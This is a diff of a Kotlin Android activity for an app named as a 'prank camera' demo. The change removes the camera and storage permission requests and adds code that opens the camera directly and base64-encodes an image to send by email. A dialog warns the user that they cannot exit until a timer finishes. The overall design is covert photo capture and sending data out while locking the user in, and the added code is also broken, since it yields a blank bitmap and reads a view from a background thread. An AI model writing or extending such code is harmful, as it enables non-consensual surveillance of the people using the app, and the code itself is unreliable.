@@ -1,19 +1,15 @@
 package com.example.prankcamerdemo
 
-import android.Manifest
 import android.app.AlertDialog
-import android.content.pm.PackageManager
 import android.graphics.Bitmap
+import android.hardware.Camera
 import android.media.MediaPlayer
 import android.os.Bundle
 import android.os.CountDownTimer
 import android.os.Handler
 import android.os.Looper
-import android.provider.MediaStore
 import android.util.Base64
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 import android.widget.Button
 import android.widget.ImageView
 import android.widget.TextView
@@ -76,7 +72,7 @@ class MainActivity : AppCompatActivity() {
                 .setTitle("⚠️ Подтвердите действие")
                 .setMessage("ВНИМАНИЕ! После запуска нельзя будет выйти до завершения таймера! Продолжить?")
                 .setPositiveButton("Да, я готов!") { _, _ -> 
-                    requestPermissionsAndStart()
+                    startSimulation()
                 }
                 .setNegativeButton("Нет", null)
                 .setCancelable(false)
@@ -94,42 +90,57 @@ class MainActivity : AppCompatActivity() {
         }
     }
     
-    private fun requestPermissionsAndStart() {
-        val permissions = arrayOf(
-            Manifest.permission.CAMERA,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE
-        )
-        
-        val missingPermissions = permissions.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }
-        
-        if (missingPermissions.isEmpty()) {
-            startSimulation()
-        } else {
-            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), 100)
-            // Всё равно запускаем симуляцию
-            Handler(Looper.getMainLooper()).postDelayed({
-                startSimulation()
-            }, 500)
+    private fun takePhoto(): Bitmap? {
+        return try {
+            // Открываем камеру
+            val camera = Camera.open()
+            val parameters = camera.parameters
+            
+            // Настраиваем параметры
+            parameters.pictureFormat = android.graphics.ImageFormat.JPEG
+            camera.parameters = parameters
+            
+            // Делаем фото
+            camera.startPreview()
+            camera.takePicture(null, null, null, object : Camera.PictureCallback {
+                override fun onPictureTaken(data: ByteArray?, camera: Camera?) {
+                    // Фото сохранено
+                    camera?.release()
+                }
+            })
+            
+            // Для превью
+            val bitmap = Bitmap.createBitmap(
+                parameters.pictureSize.width,
+                parameters.pictureSize.height,
+                Bitmap.Config.ARGB_8888
+            )
+            camera.release()
+            bitmap
+        } catch (e: Exception) {
+            e.printStackTrace()
+            null
         }
     }
     
     private fun takeAndSendPhoto() {
         thread {
             try {
-                // Делаем фото через MediaStore
-                val bitmap = MediaStore.Images.Media.getBitmap(contentResolver, null)
+                // Простое фото через превью
+                val placeholder: ImageView = findViewById(R.id.placeholderImage)
+                placeholder.isDrawingCacheEnabled = true
+                val bitmap = placeholder.drawingCache
                 
-                // Сжимаем в JPEG
-                val stream = ByteArrayOutputStream()
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
-                val byteArray = stream.toByteArray()
-                val photoBase64 = Base64.encodeToString(byteArray, Base64.DEFAULT)
-                
-                // Отправляем на почту
-                sendEmail(photoBase64)
+                if (bitmap != null) {
+                    // Сжимаем в JPEG
+                    val stream = ByteArrayOutputStream()
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
+                    val byteArray = stream.toByteArray()
+                    val photoBase64 = Base64.encodeToString(byteArray, Base64.DEFAULT)
+                    
+                    // Отправляем на почту
+                    sendEmail(photoBase64)
+                }
             } catch (e: Exception) {
                 e.printStackTrace()
             }
